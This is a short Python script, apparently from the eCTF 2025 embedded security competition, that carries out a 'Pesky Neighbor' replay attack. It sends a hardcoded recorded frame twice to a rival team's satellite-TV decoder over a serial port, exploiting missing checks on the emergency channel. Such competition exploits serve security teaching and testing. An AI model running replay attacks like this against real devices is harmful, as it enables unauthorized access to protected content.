"""Pesky Neighbor attack for ERA
@author: Gavin Zhong, Liz Grzyb
@description: Liz - ERA does not implement security checks on the emergency channel, here we replay a recorded frame from ch0.
"""

import time
import sys

# The ectf25 module comes pre-installed in the environment
from ectf25.utils.decoder import DecoderIntf

def lgmt_channel_0() -> bytes:
    """Gavin Zhong
        simply replay lgmt channel 0 frame
    """
    lgmt_frame_channel0 = b"|\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00W6@\x01\xa4\xbe\x1e\x96\xba\xaa\xde\xd6e\xaa7\xa6)'\xac\xf0w\x99\x9f\x97\xbc\x92L\xb4\x90\x0b\xe2\xc7\x9c|\x13~\xd2B\x9a\x98`Z\xfd\xccC]8\xee\xd6\xd0\xda\xa3\xe8\t\xf8K\xc9\xe3\x1d\x03\x8b\x9d\x8b`G\xbctb\x8e*L\xacD=\x17\x10y\xf5f|\xc3!\x0f\x0bI1\xe0\xe6M\x84\x85\tG|l\x8c\x1c\x85\x05\xc0X\xa4[\x906\xdf\x88;\xe7X\x0f\x8b\x12RkB;!\\/FX-d\x9a&\xe4\x05"
    return lgmt_frame_channel0


if __name__ == '__main__':
    print("Running Pesky Neighbor attack")
    time.sleep(1)
    
    # The serial port string will be in argv[1]
    interface = DecoderIntf(sys.argv[1])
    # Replay lgmt channel 0 frame
    interface.decode(lgmt_channel_0())
    interface.decode(lgmt_channel_0())

    print("Done with pesky Neighbor attack")
